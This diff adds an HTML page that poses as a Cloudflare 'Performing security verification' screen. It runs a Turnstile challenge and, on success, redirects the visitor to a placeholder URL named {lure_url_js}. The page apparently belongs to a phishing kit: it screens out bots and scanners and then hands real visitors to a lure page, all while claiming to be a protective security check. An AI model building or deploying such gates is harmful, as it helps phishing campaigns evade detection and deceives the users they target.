@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Security Check</title>
+  <meta name="description" content="Please complete the verification check before continuing." />
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+  <style>
+    :root {
+      --bg: #f5f7fb;
+      --surface: #ffffff;
+      --text: #1f2937;
+      --muted: #4b5563;
+      --border: #dbe3f0;
+      --accent: #1d4ed8;
+      --success: #166534;
+      --error: #b91c1c;
+      --shadow: 0 18px 40px rgba(15, 23, 42, 0.08);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family:
+        "Segoe UI",
+        "Helvetica Neue",
+        Arial,
+        sans-serif;
+      background:
+        radial-gradient(circle at 100% 0%, #e7efff 0, transparent 40%),
+        radial-gradient(circle at 0% 100%, #e9f8ff 0, transparent 40%),
+        var(--bg);
+      color: var(--text);
+      display: grid;
+      place-items: center;
+      padding: 20px;
+    }
+
+    .gate {
+      width: min(100%, 520px);
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      padding: 28px 22px;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .spinner {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      border: 3px solid #c7d5fb;
+      border-top-color: var(--accent);
+      animation: spin 1s linear infinite;
+      flex-shrink: 0;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    h1 {
+      margin: 0;
+      font-size: clamp(1.1rem, 3vw, 1.35rem);
+      font-weight: 700;
+    }
+
+    p {
+      margin: 12px 0 0;
+      line-height: 1.45;
+    }
+
+    .muted {
+      color: var(--muted);
+      font-size: 0.96rem;
+    }
+
+    .widget-wrap {
+      margin-top: 22px;
+      min-height: 70px;
+    }
+
+    .status {
+      margin-top: 16px;
+      padding: 10px 12px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      background: #f8fafc;
+      color: var(--muted);
+      font-size: 0.94rem;
+    }
+
+    .status.success {
+      color: var(--success);
+      border-color: #bbf7d0;
+      background: #f0fdf4;
+    }
+
+    .status.error {
+      color: var(--error);
+      border-color: #fecaca;
+      background: #fef2f2;
+    }
+
+    .footer {
+      margin-top: 18px;
+      font-size: 0.86rem;
+      color: var(--muted);
+    }
+
+    code {
+      font-family:
+        ui-monospace,
+        SFMono-Regular,
+        Menlo,
+        Monaco,
+        Consolas,
+        "Liberation Mono",
+        "Courier New",
+        monospace;
+    }
+
+    @media (max-width: 480px) {
+      .gate {
+        padding: 22px 16px;
+        border-radius: 14px;
+      }
+
+      .header {
+        align-items: flex-start;
+      }
+
+      .spinner {
+        width: 24px;
+        height: 24px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <main id="cf-turnstile" class="gate" aria-live="polite">
+    <div class="header">
+      <div class="spinner" aria-hidden="true"></div>
+      <h1>Performing security verification</h1>
+    </div>
+
+    <p class="muted">
+      This website uses a security service to protect against malicious bots. This page is displayed while the website
+      verifies you are not a bot. You will be redirected
+      automatically when verification succeeds.
+    </p>
+
+    <div class="widget-wrap">
+      <div id="turnstile-widget"></div>
+    </div>
+
+    <div class="status" id="status" role="status">
+      Initializing verification challenge...
+    </div>
+
+    <p class="footer">
+      Security check powered by Cloudflare.
+    </p>
+
+    <noscript>
+      <p class="status error">
+        JavaScript is required to complete this security check.
+      </p>
+    </noscript>
+  </main>
+  <script>
+  turnstile.ready(function () {
+          turnstile.render('#cf-turnstile', {
+              sitekey: '0x4AAAAAACGPSp7_7AMrNNN_', // replace this with your own sitekey
+              callback: function(token) {
+                  window.location.assign({lure_url_js});
+              },
+          });
+      });
+  </script>
+</body>
+
+</html>
